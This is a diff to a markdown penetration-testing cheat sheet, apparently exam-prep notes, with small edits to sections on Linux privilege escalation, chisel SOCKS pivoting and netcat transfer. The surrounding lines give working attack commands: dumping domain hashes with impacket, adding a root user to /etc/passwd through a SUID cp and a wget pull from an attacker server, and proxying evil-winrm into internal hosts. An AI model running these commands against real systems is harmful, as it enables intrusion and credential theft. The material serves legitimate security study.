@@ -1600,6 +1600,7 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 - [if SUID bit set for cp, we can add a new user with root privileges to /etc/passwd file] to create new user(name: ignite) at end of /etc/passwd, first generate the $hash value first using 'openssl passwd -1 -salt ignite pass123'. Then insert $hash into 'ignite:$hash:0:0:root:/root:/bin/bash'. Then copy the passwd file back to victim machine (/etc) using 'wget -O passwd http://192.168.1.108:8000/passwd'. Then 'su ignite' password: 'pass123', 'whoami'.
 - admin to give SUID permission to nano: 'chmod u+s /bin/nano'
 - if WinPEAS failed i.e. Error, try using Seatbelt
+- transfer nc from kali to windows: 'locate nc.exe' then host the folder that contains nc.exe
 
 ## MSFVenom
 
@@ -1733,7 +1734,7 @@ C:\WINDOWS\Temp>copy \\10.11.0.XXX\smb\ms11-046.exe \windows\temp\a.exe
 #PORT = port for the Chisel traffic
 #socks5 = to setup a SOCKS5 proxy
 #reverse = to tell Chisel to wait for a connection from a client
-chisel server --port 1080 --sock5 --reverse
+./chisel server --port 1080 --sock5 --reverse
 
 #On your attacking machine edit the file /etc/proxychains4.conf #1080 is the sock5 port
 #Chisel
@@ -1745,6 +1746,7 @@ socks5 127.0.0.1 1080
 #PORT = The port you set on your Chisel sever
 #R:socks = enables the reverse SOCKS proxy
 #max-retry-count 1 = to exit Chisel when you kill your server
+#must be same port as chisel server
 .\Chisel.exe client --max-retry-count 1 192.168.60.200:1080 R:socks
 
 #You can now attack the third server (ex. 10.0.60.99) by adding proxychains -q before every command. The -q is for quiet mode since most attackers won’t need verbose proxy traffic
@@ -1757,6 +1759,9 @@ proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p ''
 
 #or on attacker's kali, you can connect to the third server using 127.0.0.1 on web browser. If the web browser shows unable to connect, then add thehost name to /etc/hosts
 ```
+
+### Using Ligolo-ng
+
 
 ## compiling windows exploit on kali
 ```bash
